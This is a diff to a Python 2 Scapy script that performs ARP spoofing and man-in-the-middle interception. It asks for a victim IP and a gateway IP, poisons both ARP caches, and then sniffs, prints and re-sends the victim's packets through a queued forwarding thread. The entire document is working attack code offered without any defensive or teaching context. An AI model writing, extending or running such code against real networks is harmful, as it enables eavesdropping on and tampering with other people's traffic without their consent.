@@ -8,6 +8,7 @@ import sys
 import os
 import time
 import threading
+import Queue
 sp.conf.verb = 0
 BROADCAST = "ff:ff:ff:ff:ff:ff"
 REPLAY = 2
@@ -18,6 +19,7 @@ class Attack_Info(object, ):
         self.mIP = my_ip
         self.gIP = gate_ip
         self.vIP = victim_ip
+        self.mac = [sp.get_if_hwaddr(i) for i in sp.get_if_list()][0]
         self.arp_table = {ip: Attack_Info.get_mac(ip) for ip in [self.vIP,self.gIP]}
 
     @staticmethod
@@ -55,6 +57,7 @@ class Attack_Thread(object, ):
 
     def close(self,):
         self.stop.clear()
+        self. set_ip_forward(0)
         sp.send(sp.ARP(op=REPLAY, pdst=info.gIP, psrc=info.vIP, hwdst=BROADCAST,
                        hwsrc=info.arp_table[info.vIP],), count=7)
         sp.send(sp.ARP(op=REPLAY, pdst=info.vIP, psrc=info.gIP, hwdst=BROADCAST,
@@ -63,6 +66,7 @@ class Attack_Thread(object, ):
 
     def run(self, ):
         self.stop.set()
+        self.set_ip_forward(0)
         try:
             self.sniffer = Mitm_Thread(self.stop, )
             self.sniffer.start()
@@ -89,30 +93,29 @@ class Mitm_Thread(threading.Thread):
     """
     def __init__(self, stop):
         self.stop = stop
+        self.q = Queue.Queue()
+        self.forwader = threading.Thread(target=self.pkt_handler)
         super(Mitm_Thread, self).__init__()
-
     def run(self, ):
-        print info.mIP
-        bpf_filter = 'not (dst host %s or  src host %s) and (dst host %s or src host %s) ' % (info.mIP, info.mIP, info.vIP, info.vIP) 
-        print bpf_filter
+        self.forwader.start()
+        bpf_filter = '(not (dst host %s or  src host %s)) and ether dst %s' % (info.mIP, info.mIP, info.mac) 
         while self.stop.wait(0):
-            sp.sniff(filter=bpf_filter, count=1, timeout=0.2, prn=self.pkt_handler)
-
-    def pkt_handler(self, pkt):
-        if pkt.haslayer(sp.IP):
-            ip = pkt.getlayer(sp.IP)
-            # if the ip is not in the arp table take the gateaway ip(most of the times true)
-            get_mac = lambda x: info.arp_table.get(x,info.arp_table[info.gIP])
-            # print ip.src, get_mac(ip.src)
-            # print ip.dst, get_mac(ip.dst)
-            ether = sp.Ether(src=get_mac(ip.src), dst=get_mac(ip.dst))
-            pk = ether/ip
-            pk.show()
-            sp.sendp(ether/ip)
-
+            sp.sniff(filter=bpf_filter, timeout=5, prn=lambda pkt: self.q.put(pkt))
+        self.q.put("exit")
+    def pkt_handler( self):   
+        while 1:
+            pkt = self.q.get()
+            if pkt == "exit": break
+            if pkt.haslayer(sp.IP):
+                pkt.show()
+                ip = pkt.getlayer(sp.IP)
+                get_mac = lambda x: info.arp_table.get(x, info.arp_table[info.gIP])
+                ether = sp.Ether(dst=get_mac(ip.dst))
+                sp.sendp(ether/ip)
 
 
-print "newst"
+
+print "newstfsdt"
 vIP, gIP = tuple(raw_input("pls enter " + x + " ") for x in ["victimIP", "gateIP"])
 mIP = ((([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")] or [[(s.connect(("8.8.8.8", 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) + ["no IP found"])[0])
 info = Attack_Info(vIP, gIP, mIP)
